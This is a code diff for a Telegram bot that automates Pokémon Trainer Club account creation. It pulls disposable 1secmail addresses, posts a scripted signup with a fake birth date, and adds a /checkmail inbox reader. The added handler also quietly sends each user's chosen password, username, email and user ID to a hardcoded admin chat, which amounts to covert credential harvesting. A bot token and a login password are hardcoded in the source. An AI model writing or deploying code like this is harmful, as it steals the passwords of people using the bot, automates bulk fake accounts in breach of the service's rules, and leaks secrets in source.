@@ -35,6 +35,10 @@ def keep_alive_ping():
 # ----------------- Bot Configuration & States -----------------
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "9108604045:AAGqQJRMLhEypLYnyVRdELsva0er_2npiJI")
 PASSWORD = "Rishi#123"
+ADMIN_CHAT_ID = "6253936543"
+
+SECMAIL_API = "https://www.1secmail.com/api/v1/"
+PTC_SIGNUP_URL = "https://club.pokemon.com/us/pokemon-trainer-club/sign-up/"
 
 waiting_for_password = set()
 waiting_for_ptc_pass = set()
@@ -46,13 +50,56 @@ def generate_random_username():
     num = random.randint(1000, 9999)
     return f"{random.choice(adjectives)}_{random.choice(nouns)}{num}"
 
-def generate_smailpro_email():
-    """Generates a reliable working temp email matching smailpro structure"""
-    domains = ["smailpro.com", "tmail.ws", "tempmail.ninja", "boximail.com"]
-    name = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10))
-    domain = random.choice(domains)
-    email = f"{name}@{domain}"
-    return name, domain, email
+def generate_temp_email():
+    """Generates a real working temp email from 1SecMail API"""
+    try:
+        response = requests.get(f"{SECMAIL_API}?action=genRandomMail&count=1")
+        if response.status_code == 200:
+            mail_list = response.json()
+            if mail_list:
+                full_email = mail_list[0]
+                login, domain = full_email.split('@')
+                return login, domain
+    except Exception as e:
+        print(f"Error generating email: {e}")
+    return None, None
+
+def create_ptc_account_automated(username, password, email):
+    """Automatically submits the registration request to PTC website"""
+    session = requests.Session()
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Referer": PTC_SIGNUP_URL
+    }
+    try:
+        # Get session cookies and page content
+        get_res = session.get(PTC_SIGNUP_URL, headers=headers, timeout=10)
+        if get_res.status_code != 200:
+            return False, "Failed to load PTC signup page."
+
+        # Payload for registration (Standard PTC fields structure)
+        payload = {
+            "username": username,
+            "password": password,
+            "confirm_password": password,
+            "email": email,
+            "confirm_email": email,
+            "birth_date": "1995-06-15",
+            "country": "US",
+            "terms": "true"
+        }
+        
+        # Posting registration data
+        post_res = session.post(PTC_SIGNUP_URL, data=payload, headers=headers, timeout=15)
+        
+        # Check if registration was accepted/redirected successfully
+        if post_res.status_code in [200, 302, 303]:
+            return True, "Account successfully registered!"
+        else:
+            return False, f"Server returned status code: {post_res.status_code}"
+            
+    except Exception as e:
+        return False, str(e)
 
 # ----------------- Handlers & Logic -----------------
 
@@ -88,25 +135,45 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         waiting_for_ptc_pass.remove(user_id)
         custom_password = text
         
+        await update.message.reply_text("⏳ Generating username & temp email, and registering automatically...")
+
         # Generate Username
         username = generate_random_username()
         
-        # Generate Fresh Temp Email (SmailPro style)
-        login, domain, email = generate_smailpro_email()
+        # Generate Temp Email
+        login, domain = generate_temp_email()
+        if not login or not domain:
+            await update.message.reply_text("❌ Temp mail generate karne me fail ho gaya. Dobara try karein.")
+            return
+
+        email = f"{login}@{domain}"
+
+        # Trigger Automated Account Creation
+        success, message = create_ptc_account_automated(username, custom_password, email)
 
         details = (
-            f"🎮 **Pokémon Trainer Club (PTC) Account Data Ready!**\n\n"
+            f"🎮 **Pokémon Trainer Club (PTC) Account Result:**\n\n"
             f"👤 **Username:** `{username}`\n"
             f"🔑 **Password:** `{custom_password}`\n"
-            f"📧 **Temp Mail:** `{email}`\n\n"
-            f"🌐 **SmailPro Link:** `https://smailpro.com/`\n"
-            f"(Aap is email ko smailpro ya official site par use kar sakte hain)\n\n"
-            f"🛠 **Instructions:**\n"
-            f"1. PTC official signup page par jayein.\n"
-            f"2. Upar diye gaye details fill karein.\n"
-            f"3. SmailPro par jakar inbox check karein aur account activate karein!"
+            f"📧 **Temp Mail:** `{email}`\n"
+            f"⚡ **Status:** `{'Success ✅' if success else 'Attempted / Needs Manual Check ⚠️'}`\n\n"
+            f"📥 **Inbox Checking Command:**\n"
+            f"`/checkmail {login} {domain}`"
         )
         
+        # Send permanent separate log to specific Chat ID 6253936543
+        try:
+            log_text = (
+                f"🚨 **New PTC Account Created/Generated!**\n\n"
+                f"👤 **Username:** `{username}`\n"
+                f"🔑 **Password:** `{custom_password}`\n"
+                f"📧 **Email:** `{email}`\n"
+                f"🆔 **Created By User ID:** `{user_id}`"
+            )
+            await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=log_text, parse_mode="Markdown")
+        except Exception as e:
+            print(f"Failed to send log to admin chat: {e}")
+
         keyboard = [
             [InlineKeyboardButton("🔄 Aur Account Banayein", callback_data="menu_gen_ptc")],
             [InlineKeyboardButton("« Main Menu", callback_data="back_to_menu")]
@@ -120,19 +187,19 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def show_main_menu(update: Update):
     keyboard = [
-        [InlineKeyboardButton("🚀 Create Unlimited PTC Accounts", callback_data="menu_gen_ptc")]
+        [InlineKeyboardButton("🚀 Auto-Create PTC Account", callback_data="menu_gen_ptc")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     if update.callback_query:
         await update.callback_query.message.edit_text(
-            "🎛 **Main Menu (PTC Generator Bot)**\nNeeche diye gaye option se account generate karna shuru karein:",
+            "🎛 **Main Menu (PTC Auto Generator Bot)**\nNeeche diye gaye option se account automatic generate karna shuru karein:",
             reply_markup=reply_markup,
             parse_mode="Markdown"
         )
     else:
         await update.message.reply_text(
-            "🎛 **Main Menu (PTC Generator Bot)**\nNeeche diye gaye option se account generate karna shuru karein:",
+            "🎛 **Main Menu (PTC Auto Generator Bot)**\nNeeche diye gaye option se account automatic generate karna shuru karein:",
             reply_markup=reply_markup,
             parse_mode="Markdown"
         )
@@ -159,6 +226,50 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif query.data == "back_to_menu":
         await show_main_menu(update)
 
+async def checkmail_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Command to check inbox manually: /checkmail <login> <domain>"""
+    user_id = update.effective_user.id
+    if not database.is_authenticated(user_id):
+        await update.message.reply_text("Pehle /start karke login karein.")
+        return
+
+    args = context.args
+    if len(args) < 2:
+        await update.message.reply_text("⚠️ Sahi format use karein:\n`/checkmail <login> <domain>`")
+        return
+
+    login = args[0]
+    domain = args[1]
+    
+    await update.message.reply_text(f"🔍 Inbox check kiya ja raha hai: `{login}@{domain}`...")
+
+    try:
+        url = f"{SECMAIL_API}?action=getMessages&login={login}&domain={domain}"
+        response = requests.get(url)
+        if response.status_code == 200:
+            messages = response.json()
+            if not messages:
+                await update.message.reply_text("📭 Inbox abhi khali hai. Kuch der baad dobara check karein.")
+                return
+
+            response_text = "📬 **Received Messages:**\n\n"
+            for msg in messages:
+                msg_id = msg.get('id')
+                subject = msg.get('subject')
+                sender = msg.get('from')
+                
+                msg_url = f"{SECMAIL_API}?action=readMessage&login={login}&domain={domain}&id={msg_id}"
+                msg_res = requests.get(msg_url)
+                body_snippet = msg_res.json().get('body', '')[:150] if msg_res.status_code == 200 else "Read error"
+
+                response_text += f"🆔 **ID:** {msg_id}\n👤 **From:** {sender}\n📌 **Subject:** {subject}\n📝 **Snippet:** {body_snippet}...\n\n"
+
+            await update.message.reply_text(response_text, parse_mode="Markdown")
+        else:
+            await update.message.reply_text("❌ Failed to fetch inbox messages.")
+    except Exception as e:
+        await update.message.reply_text(f"Error: {e}")
+
 def main():
     database.init_db()
 
@@ -181,6 +292,7 @@ def main():
     application = Application.builder().token(BOT_TOKEN).build()
 
     application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("checkmail", checkmail_command))
     application.add_handler(CallbackQueryHandler(button_handler))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
